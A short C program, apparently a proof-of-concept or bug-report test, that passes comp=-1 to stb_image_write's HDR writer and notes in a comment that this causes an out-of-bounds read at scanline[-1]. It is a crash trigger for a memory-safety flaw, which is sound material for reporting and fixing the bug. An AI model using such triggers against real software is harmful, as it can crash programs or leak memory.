#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "stb_image_write.h"
#include <stdlib.h>

static void my_write_func(void *context, void *data, int size)
{
   (void)context; (void)data; (void)size;
}

int main(void)
{
   float buf[4] = { 1.0f, 0.5f, 0.0f, 1.0f };
   // comp=-1 in HDR writer: scanline[x*ncomp+0] with x=1 gives scanline[-1] → OOB read
   stbi_write_hdr_to_func(my_write_func, NULL, 2, 1, -1, buf);
   return 0;
}
